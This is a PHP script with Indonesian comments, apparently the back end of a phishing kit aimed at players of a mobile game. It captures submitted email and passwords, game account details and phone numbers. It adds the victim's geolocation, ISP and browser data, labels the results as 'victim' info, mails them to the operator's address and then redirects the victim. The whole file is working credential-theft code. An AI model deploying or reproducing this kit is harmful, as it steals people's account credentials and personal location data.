<?php
// MENGAMBIL KONTROL
include 'API-AlexHosting.net/bendera.php';
include 'API-AlexHosting.net/UserAgent.php';
include 'API-AlexHosting.net/daerah.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$user = $_POST['user'];
$pass = $_POST['pass'];
$login = $_POST['login'];
$nickname = $_POST['nickname'];
$playid = $_POST['playid'];
$elitepass = $_POST['elitepass'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$phone = $_POST['phone'];
$ips = $_SERVER['REMOTE_ADDR'];

$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];


// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($user == "" && $pass == "" && $nickname == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$resultFlags | $nickname [Level $level] | Login $login";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
            <tr>
				<th style="text-align: center;" colspan="3">
                <img src="https://i.ibb.co/j53Pkb9/Imgku.jpg">
                </th>
				</tr>

					<th style="text-align: center;" colspan="3"> Info Login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email $login</td>
					<td style="text-align: center;">$user</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$pass</td>
				</tr>
                <tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: center;">$login</td>
				</tr>
				</tr>

					<th style="text-align: center;" colspan="3"> Info Akun </th>
				</tr>
				<tr>
					<td style="border-right: none;">Nickname</td>
					<td style="text-align: center;">$nickname</td>
				</tr>
				<tr>
					<td style="border-right: none;">ID Game</td>
					<td style="text-align: center;">$playid</td>
				</tr>
				<tr>
					<td style="border-right: none;">No. Telp</td>
					<td style="text-align: center;">$phone</td>
				</tr>
                <tr>
					<td style="border-right: none;">Level</td>
					<td style="text-align: center;">$level</td>
				</tr>
				<tr>
					<td style="border-right: none;">Tier</td>
					<td style="text-align: center;">$tier</td>
				</tr>
				<tr>
					<td style="border-right: none;">Elitepass</td>
					<td style="text-align: center;">$elitepass</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Info Daerah & Korban</th>
				</tr>
				<tr>
					<td style="border-right: none;">Negara</td>
					<td style="text-align: center;">$negara</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kota</td>
					<td style="text-align: center;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: center;">$latitude</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: center;">$longtitude</td>
				</tr>
                <tr>
					<td style="border-right: none;">Zona Waktu</td>
					<td style="text-align: center;">$timezone</td>
				</tr>
                <tr>
					<td style="border-right: none;">Perdana</td>
					<td style="text-align: center;">$perdana</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ips</td>
				</tr>
                <tr>
					<td style="border-right: none;">Platform</td>
					<td style="text-align: center;">$platform</td>
				</tr>
                <tr>
					<td style="border-right: none;">OS</td>
					<td style="text-align: center;">$osversi</td>
				</tr>
                <tr>
					<td style="border-right: none;">Browser</td>
					<td style="text-align: center;">$browser</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; AlexHosting</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($alexhost, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='$download' method='POST' action='success.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('www.tokoditznesia.my.id').submit();</script>";
}
}
?>